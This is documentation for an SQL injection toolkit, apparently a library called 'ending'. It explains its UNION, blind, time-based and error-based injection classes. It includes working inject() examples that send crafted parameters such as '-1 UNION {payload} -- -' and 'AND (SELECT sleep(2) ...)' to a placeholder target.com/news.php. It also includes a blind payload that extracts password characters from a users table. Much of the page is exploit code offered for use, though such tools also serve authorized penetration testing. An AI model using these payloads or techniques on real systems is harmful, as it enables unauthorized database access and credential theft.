# Injection methods

An injection method fetches the results from a query. **ending** implements every standard injection method, and provides base classes to implement new ones easily. The most used methods are:

<!-- no toc -->
- [`SelectMethod`: UNION and raw queries](#selectmethod-union-and-raw-queries)
- [`TestMethod`: blind](#testmethod-blind)
- [`TimebasedTestMethod`: time-based](#timebasedtestmethod-time-based)
- [`ErrorBasedMethod`: error-based injection](#errorbasedmethod-error-based-injection)


## Instanciating a method

A method constructor always requires a [compiler](compiler.md) and an `inject` coroutine.

The `inject` coroutine is given a payload in the form of an [AST node](ast.md) as its single argument.
Depending on the injection method, it should return different things:

- For *display* methods (UNION-based, error-based), it should return the contents of the response as `bytes`
- For *test* methods (blind), it should return `True` or `False` depending on the result
- For *time-based* or *out-of-bounds* methods, it should not return anything

For some methods, you may have to specify a few other parameters. This page only describes the essential parameters for the most used methods. Refer to the documentation of each method for a full description of its parameters.

## Using a method

Simply build a query and fetch it:

```python
query = Query("users").columns("username", "email").limit(3)
results = await method.fetch(query)

print(results)
```

## Methods

### `SelectMethod`: UNION and raw queries

Example payload: `SELECT 1,1,CONCAT(...),1,1 FROM ... WHERE ...`

#### Parameters

| Parameter | Description | Type | Required |
|-----------|-------------|------|:--------:|
| columns   | Number of columns in the statement | `int` | YES |
| column    | Index of a column that is displayed in the response | `int` | YES |
| nb_rows   | Number of rows to dump at once | `int` | YES |
| hex       | Whether to dump rows as hexadecimal | `bool` | FALSE |

#### Example `inject()` method

```python
async def inject(payload: Node) -> bytes:
    param = f"-1 UNION {payload} -- -"
    response = await session.get('http://target.com/news.php', params={"id": param})
    return response.content
```

### `TestMethod`: blind

Performs a blind SQL injection. The payloads given to the `inject()` method are SQL conditions, *i.e.* boolean statements.

Example payload:

```sql
ORD(SUBSTRING((SELECT password FROM users LIMIT 1,1),10,1)) 
IN (61, 62, 63, ...)
```

`TestMethod` expects the `inject()` method to return **true** if the submitted test was true, or **false** otherwise. As such, `inject()` should, for instance, verify the presence of a keyword in the response.

#### Parameters

| Parameter | Description | Type | Required |
|-----------|-------------|------|:--------:|
| wildcard  | Replacement character for unknown chars | `str` | NO |
| resilient  | If `True`, the method periodically checks that its results are correct. | `bool` | NO |

#### Example `inject()` method

```python
async def inject(payload: Node) -> bool:
    # The payload is a condition: integrate it to the query
    param = f"7 AND {payload}"
    # Run the HTTP request
    response = await session.get('http://target.com/news.php', params={"id": param})
    # If news 7 is displayed in the response, the condition was true!
    return '<title>News #7</title>' in response.content
```

### `TimebasedTestMethod`: time-based

Performs a time-based SQL injection.

Example payload: 

```sql
ORD(SUBSTRING((SELECT password FROM users LIMIT 1,1),10,1)) 
IN (61, 62, 63, ...)
```

#### Parameters

| Parameter | Description | Type | Required |
|-----------|-------------|------|:--------:|
| delay  | Minimum delay induced by SQL statements that evaluate to true | `float` | YES |
| wildcard  | Replacement character for unknown chars | `str` | NO |
| resilient  | If `True`, the method periodically checks that its results are correct. Defaults to true. | `bool` | NO |

#### Example `inject()` method

`TimebasedTestMethod` expects its `inject()` method to induce a delay if the submitted test was true, or no delay otherwise.

```python
async def inject(condition: Node) -> None:
    # The payload is a condition: integrate it to the query
    param = f"7 AND (SELECT sleep(2) FROM DUAL WHERE {condition})"
    # Run the HTTP request
    response = await session.get('http://target.com/news.php', params={"id": param})
    # No response is expected
```

#### Resilience

Time-based SQL injections are annoying to deal with: a single response lag may convert a *false* into a *true*, making the results wrong, and forcing you to start the injection again. To avoid this, `TimebasedTestMethod` have the `resilient` parameter set to *true* by default. When this parameter is set, the method periodically checks that the obtained results are correct, and retries the injection otherwise. For instance, after a character has been dumped, **ending** verifies that the character is correct before going on. If it is not, it retrieves it again.

It is not perfect, but does the job pretty well when the connection gets a little bit laggy.

#### Dump strategy

When performing a standard blind SQL injection, trying to find out the value of some character `c` for instance, dichotomy is the best way to go. You first perform a test to check if `c` is in the first part of the alphabet. Depending on the response, you can discard half of the alphabet and try again, until only one character remains.

However, when time is involved, this is not true anymore: as a test that returns *true* takes longer than a test that returns *false*, it is more efficient to have tests that return the latter.

For instance, if the delay induced by the injection is of 5 seconds, and a normal request takes 100ms, you need an average of 20.800s to find a letter `c` in a charset of 256 entries. If you performed the tests one by one, you'd get an average of 17.8s, which is faster! However, both methods are not optimal: a best way to perform the injection would be to split the charset in 4 parts instead, leading to an average of 15.6s.

The `TimebasedTestMethod` automatically computes the best way to perform an injection in function of the time a slow request and fast one take to complete, producing enormous performance improvements when compared to standard dump techniques.

### `ErrorBasedMethod`: error-based injection

Error-based injection methods, such as MySQL's `ExtractValue()` or PostgreSQL's `CAST() as INT`, are already implemented. They take no extra arguments. Refer to the documentation of each module to get a list.

To create a new one, use `ErrorBasedMethod` as the base class.


#### Parameters

| Parameter | Description | Type | Required |
|-----------|-------------|------|:--------:|
| pattern   | A regex to find results in the page | `str` | NO |
| size      | Maximum size of the error message | `int` | YES |
| hex       | Whether to dump rows as hexadecimal | `bool` | FALSE |

#### Example `inject()` method

```python
async def inject(payload: Node) -> bytes:
    param = f"7 AND {payload}"
    response = await session.get('http://target.com/news.php', params={"id": param})
    return response.content
```

## Tags

Most of text-based methods (`SelectMethod`, `ChunkMethod` for instance) use tags to determine the beginning and end of the data in the page, or split the data. By default, they are all a string of 4 random characters. Sometimes, you might have constraints that force you to change them. Just create a subclass of the method, and change the tag in the class description.

Say your injection returns data as lowercase. You can just use lowercase tags:

```python
class LowerChunkMethod(mysql.ChunkMethod):
    tag_start = "tag-start"
    tag_stop = "tag-stop"
    tag_separator = "tag-sep"
    tag_null = "tag-null"
```

Refer to the documentation of each method to see which tag it uses.